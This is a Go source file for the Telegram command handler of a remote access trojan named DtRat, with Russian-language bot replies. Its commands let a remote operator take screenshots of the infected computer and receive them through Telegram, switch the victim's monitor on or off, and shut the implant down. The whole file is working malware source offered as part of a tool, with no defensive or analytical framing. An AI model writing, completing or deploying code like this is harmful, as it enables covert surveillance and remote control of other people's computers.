package bot

import (
	"dtrat/config"
	"dtrat/engine"
	"dtrat/global"
	"os"
)

func (b *Tgbot) startCmd() {
	b.Send("Вас приветствует DtRat %s!", config.Version)
}

func (b *Tgbot) defaultCmd() {
	b.Send("Неизвестная команда, используйте /help что-бы получить спискок доступных команд и справку по их использованию")
}

func (b *Tgbot) helpCmd() {
	b.Send("Доступные команды:\n")
}

func (b *Tgbot) killCmd() {
	b.Send("Пока!")
	close, err := global.Get("rat_close_func")
	if err == global.ErrNotFound {
		b.Send("Функция завершения почему то не определена в глобальном хранилище")
		return
	}

	close.(func())()
}

func (b *Tgbot) screenshotCmd(eng *engine.Engine) {
	screenshot, err := eng.System.Screenshot()
	defer os.Remove(screenshot)

	if err != nil {
		b.Send("Ошика: %v", err)
		return
	}

	b.SendFile(screenshot)
}

func (b *Tgbot) monitorCmd(args string, eng *engine.Engine) {
	if args != "on" && args != "off" {
		b.Send("Используйте /monitor [on|off]")
		return
	}

	var err error = nil
	switch args {
	case "on":
		err = eng.System.MonitorState(true)
	case "off":
		err = eng.System.MonitorState(false)
	}

	if err != nil {
		b.Send("Ошибка: %v", err)
		return
	}

	switch args {
	case "on":
		b.Send("Монитор включен")
		return
	case "off":
		b.Send("Монитор выключен")
		return
	}
}
